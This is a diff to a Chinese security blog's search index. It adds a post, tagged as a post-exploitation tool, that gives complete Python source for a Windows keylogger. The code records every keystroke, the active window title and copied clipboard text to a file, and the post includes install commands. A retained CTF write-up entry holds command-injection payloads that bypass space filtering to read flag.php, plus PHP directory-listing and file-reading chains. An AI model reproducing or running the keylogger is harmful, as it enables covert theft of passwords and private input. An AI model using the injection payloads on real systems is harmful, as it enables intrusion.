@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[键盘记录]]></title>
+    <url>%2F2019%2F12%2F30%2F%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%2F</url>
+    <content type="text"><![CDATA[代码使用方法:运行后直接使用,可以获取其他窗口的键盘记录,按esc键可以退出监听如果有其他刚好的功能可以联系博主,博主会竭尽所能去完成 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf-8 -*- # date:2019-12-30# author:错空import keyboardimport timeimport win32guiimport win32clipboardimport sysclass Clavier: def __init__(self,file): self.name = &apos;&apos; self.file = file def up(self,e): # 监听键盘记录 if(self.name == &apos;ctrl&apos;): if(e.name == &apos;c&apos; or e.name == &apos;x&apos;): self.Ctrl_cx() else: if(e.event_type == &apos;down&apos;): win = win32gui.GetForegroundWindow() #获取当前使用的窗口 self.name = e.name self.file.write(&quot;-&quot;*20 + &quot;Keydown Start&quot; + &apos;-&apos;*20 + &quot;\n&quot;) self.file.write(&quot;Time:&quot; + time.strftime(&quot;%a,%d %b %Y %H:%M:%S&quot;, time.gmtime()) + &quot;\n&quot;) self.file.write(&quot;Title:&quot; + win32gui.GetWindowText(win) + &quot;\n&quot;) #将当前使用窗口标题写入文件中 self.file.write(&quot;Text:&quot; + e.name + &quot;\n&quot;) self.file.write(&quot;-&quot;*20 + &quot;Keydown End&quot; + &apos;-&apos;*20 + &quot;\n&quot;) def Ctrl_cx(self): # 把剪贴板内容写入文件 try: win32clipboard.OpenClipboard() pasted_value = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() self.file.write(&quot;Copy:&quot; + pasted_value + &quot;\n&quot;) except: passif __name__ == &apos;__main__&apos;: if len(sys.argv) &gt;= 2: file = open(sys.argv[1],&apos;w&apos;) else: file = open(&apos;keyboard.txt&apos;,&apos;w&apos;) key = Clavier(file) keyboard.hook(key.up) keyboard.wait(&apos;esc&apos;) file.close() 用法环境:python3 123pip install keyboardpip install pywin32pip install win32clipboard 命令:key.txt代表把键盘记录输出到的文件 结果:]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>tool</tag>
+        <tag>后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[2019GXYCTF复盘]]></title>
     <url>%2F2019%2F12%2F29%2F2019GXYCTF%2F</url>
     <content type="text"><![CDATA[Ping Ping Ping打开页面需要我们传入ip参数,从题目名就可以知道这里是命令执行绕过发现当前目录下有index.php和flag.php,然后通过fuzz发现他过滤了空格和flag字符串和其他的一些字符,过滤空格可以用$IFS$9来绕过,因为不知道他具体过滤了哪些内容我们可以先查看index.php来查看代码127.0.0.1;cat$IFS$9index.php发现过滤了非常多,最后想到的payload 1127.0.0.1;w=g;cat$IFS$9fla$w.php 看了别人的wp发现了另外2中 1127.0.0.1;cat$IFS$9`ls` 1127.0.0.1;cat$IFS$9f`echo$IFS$PATH|cut$IFS$9-c6`ag.php BabysqliV3.0一开始被题目误导因为是sql注入,测试了半天也没有发现,看了别人的wp才发现是弱密码进去。账号:admin密码:password登入进去后是一个文件上传的页面,看到url觉得有可能存在文件包含且包含后面有加了个php后缀,也就是必须是php后缀的,我们可以先把源码个包含出来审计源码知道我们上传的文件如果没有给name传入参数就会把我们的文件名进行md5加密然后在加上.txt后缀,然后如果传入了name值那么就会用name来当文件名但是name不可以出现data://,filter://,php://, .最后面那个是空格点,因为最后面那个是空格点不上.所以我们这个正则没有什么卵用,我们可以直接上传php文件 禁止套娃通过目录扫描发现git文件泄露,用Git_Extract把文件下载查看代码后感觉好像有点难,因为他过滤了太多东西了,然后看了看题目发现禁止套娃,那肯定是套娃题啊,把他正则拿去百度了一波发现了和最近上海大学的一题类似先套用他的查看目录的payload,因为payload是存在一定随机性的所以要多试几次var_dump(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))));然后这里和上海那题有点不一样,因为他的flag.php在第三行如果要读取的话就要想其他办法,这里我想到了先把他数组进行倒序排序,然后在用next函数就可以定位到flag.php了,然后用file读取在用var_dump输出就可以得到了 1var_dump(file(next(array_reverse(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))));]]></content>
